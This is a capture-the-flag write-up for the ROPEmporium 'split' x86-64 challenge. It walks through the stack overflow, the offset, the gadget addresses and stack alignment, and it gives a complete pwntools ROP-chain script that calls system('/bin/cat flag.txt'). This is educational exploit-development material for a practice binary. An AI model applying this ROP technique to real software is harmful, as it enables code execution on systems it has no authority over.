
## Overview

**Challenge:** split  
**Platform:** ROPEmporium  
**Arch:** x86-64  
**Protections:** NX enabled, No PIE, No canary, Partial RELRO

The goal is to call `system("/bin/cat flag.txt")` using a ROP chain. The binary has NX enabled which means we can't execute shellcode directly — we have to chain together existing instructions already inside the binary to do what we want.

---

## Step 1 — Triage the binary

First thing, always run checksec to understand what protections you're working against:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

The important ones here:

- **NX enabled** — the stack is not executable. We can't write shellcode and jump to it. We need ROP.
- **No PIE** — the binary loads at a fixed base address of `0x400000` every time. Every address in the binary is static and predictable without needing a leak.
- **No canary** — nothing protecting the return address on the stack. A straight overflow will let us overwrite it cleanly.

---

## Step 2 — Understand the vulnerability

Looking at the disassembly of `pwnme`:

```asm
4006ec:  sub $0x20,%rsp          ; allocates 0x20 (32) bytes on the stack for the buffer
400723:  mov $0x60,%edx          ; reads 0x60 (96) bytes into it
400730:  call read@plt
```

The buffer is 32 bytes but `read` accepts up to 96 bytes of input. That's a classic stack buffer overflow — we can write past the end of the buffer, through saved RBP, and land directly on the saved return address.

---

## Step 3 — Find the offset

We need to know exactly how many bytes of padding to send before our ROP chain. The stack layout in `pwnme` is:

```
[  32 bytes  ] ← buffer (rbp - 0x20)
[   8 bytes  ] ← saved RBP
[   8 bytes  ] ← saved RIP  ← this is what we overwrite
```

32 + 8 = **40 bytes** to reach the saved return address.

We can confirm this by sending a cyclic pattern in GDB and checking what lands at `$rbp + 8`, or by just reading the stack layout directly from the disassembly — the buffer is at `-0x20(%rbp)` and saved RIP is always 8 bytes above saved RBP, so 0x20 + 0x8 = 0x28 = 40.

---

## Step 4 — Find the gadgets and addresses we need

The plan is:

1. Pop the address of `/bin/cat flag.txt` into `rdi` (first argument register in x86-64 calling convention)
2. Call `system`

We need three things:

**A `pop rdi; ret` gadget** — loads our string address into rdi then hands control to the next gadget. Found with pwntools:

```python
rop = ROP(elf)
# gadget at 0x4007c3: pop rdi; ret
```

**The address of `/bin/cat flag.txt`** — the string is already baked into the binary's data section. We can find it with:

```python
next(elf.search(b'/bin/cat flag.txt'))
# returns 0x601060
```

Or in GDB:

```
search-pattern "/bin/cat flag.txt"
# → 0x601060
```

**`system@plt`** — the PLT stub for system. The PLT is a trampoline that looks up the real libc address of `system` from the GOT and calls it. We use the PLT address rather than the raw libc address because without a libc leak we don't know where libc is loaded. The PLT address is static:

```
system@plt = 0x400560
```

---

## Step 5 — Stack alignment

One extra requirement: the x86-64 ABI mandates the stack must be 16-byte aligned when `system()` is called. If it isn't, `system` will crash with a SIGSEGV before doing anything useful.

When we overwrite the return address and return into our ROP chain, the stack alignment is off by 8 bytes. The fix is to prepend a bare `ret` gadget to the chain. That `ret` does nothing except consume one stack slot (8 bytes) and return to the next gadget, which nudges alignment back to where it needs to be.

Bare `ret` gadget at `0x40053e`.

---

## Step 6 — Build the payload

```
[ 40 bytes padding ] [ ret ] [ pop rdi; ret ] [ 0x601060 ] [ system@plt ]
```

Walking through it step by step:

1. 40 bytes of `A`s fill the buffer and overwrite saved RBP
2. `ret` at `0x40053e` — fixes stack alignment, then returns to next entry
3. `pop rdi; ret` at `0x4007c3` — pops the next stack value into rdi, then returns to next entry
4. `0x601060` — this gets popped into rdi. rdi is now pointing at `/bin/cat flag.txt`
5. `system@plt` at `0x400560` — calls system(rdi) which runs `/bin/cat flag.txt` and prints the flag

---

## Final script

```python
from pwn import *

elf = ELF('./split')
rop = ROP(elf)

# addresses
ret      = 0x40053e   # bare ret — stack alignment fix
pop_rdi  = 0x4007c3   # pop rdi; ret
bincat   = 0x601060   # "/bin/cat flag.txt" in .data
system   = 0x400560   # system@plt

offset = 40

payload  = b'A' * offset
payload += p64(ret)      # alignment
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(bincat)   # rdi = &"/bin/cat flag.txt"
payload += p64(system)   # system(rdi)

p = process('./split')
p.recvuntil(b'> ')
p.sendline(payload)
print(p.recvall())
```

---

## Key takeaways

**Why ROP and not shellcode?** NX marks the stack non-executable. The CPU will fault if we try to jump to it. ROP reuses instructions already marked executable inside the binary itself, so NX doesn't stop us.

**Why `pop rdi` specifically?** x86-64 passes the first function argument in `rdi`. To call `system(addr)` we need `addr` in `rdi` before the call. `pop rdi; ret` is the standard gadget for loading a controlled value into `rdi` off the stack.

**Why use PLT and not a raw libc address?** Without a libc leak we don't know where libc loaded in memory (ASLR). The PLT address is static (no PIE) and handles the resolution for us.

**Why does the alignment fix matter?** `system()` internally uses SSE instructions that require 16-byte stack alignment. If the stack is misaligned by 8 bytes when `system` is entered it will crash. The extra `ret` burns one 8-byte slot to fix it.